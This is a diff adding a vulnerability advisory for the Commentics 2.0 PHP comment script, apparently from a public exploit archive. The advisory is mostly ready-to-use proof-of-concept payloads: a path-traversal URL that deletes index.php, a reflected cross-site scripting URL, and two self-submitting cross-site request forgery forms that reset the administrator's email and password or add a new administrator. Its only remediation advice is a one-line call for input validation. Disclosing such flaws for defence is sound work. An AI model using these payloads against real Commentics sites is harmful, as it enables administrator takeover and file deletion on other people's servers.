@@ -1,0 +1,74 @@
+#################################################
+Commentics 2.0 <= Multiple Vulnerabilities
+#################################################
+
+Discovered by: Jean Pascal Pereira <pereira@secbiz.de>
+
+Vendor information:
+
+"Commentics is a free, advanced PHP comment script with many features.
+Professionally written and with open source code, its main aims are to be integrable, customizable and secure."
+
+Vendor URI: http://www.commentics.org/
+
+#################################################
+
+Issues: Cross Site Scripting, Cross Site Request Forgery / File Deletion
+
+Risk-level: High
+
+The whole administration interface is prone to several client-side attacks.
+
+-------------------------------------
+
+Exploit / Proof Of Concept:
+
+(Note that almost every parameter is vulnerable. These are only a few examples.)
+
+
+1. File deletion vulnerability (deletes index.php):
+
+http://localhost/commentics/commentics/comments/[admin_path]/index.php?page=tool_db_backup&action=delete&id=../index.php
+
+
+2. Cross Site Scripting:
+
+http://localhost/commentics/commentics/comments/[admin_path]/index.php?page=edit_page&id="><script>alert(1)</script><!--
+
+
+3. CSRF / Change admin email and password:
+
+<form method="POST" action="http://localhost/commentics/commentics/comments/[admin_path]/index.php?page=settings_administrator">
+<input type="text" name="username" value="admin" />
+<input type="text" name="password_1" value="1234" />
+<input type="text" name="password_2" value"=1234" />
+<input type="text" name="email" value="admin%40binkmail.com" />
+<input type="text" name="receive_email_new_ban" value="on" />
+<input type="text" name="receive_email_new_comment_approve" value="on" />
+<input type="text" name="receive_email_new_comment_okay" value="on" />
+<input type="text" name="receive_email_new_flag" value="on" />
+<input type="text" name="submit" value="Update" />
+</form>
+<script>document.forms[0].submit()</script>
+
+
+4. CSRF / Add new admin user
+
+<form method="POST" action="http://localhost/commentics/commentics/comments/[admin_path]/index.php?page=settings_administrator">
+<input type="text" name="username" value="newadmin" />
+<input type="text" name="password_1" value="1234" />
+<input type="text" name="password_2" value"=1234" />
+<input type="text" name="email" value="newadmin%40binkmail.com" />
+<input type="text" name="submit" value="Add+Admin" />
+</form>
+<script>document.forms[0].submit()</script>
+
+-------------------------------------
+
+Solution:
+
+Do some input validation.
+
+-------------------------------------
+
+#################################################
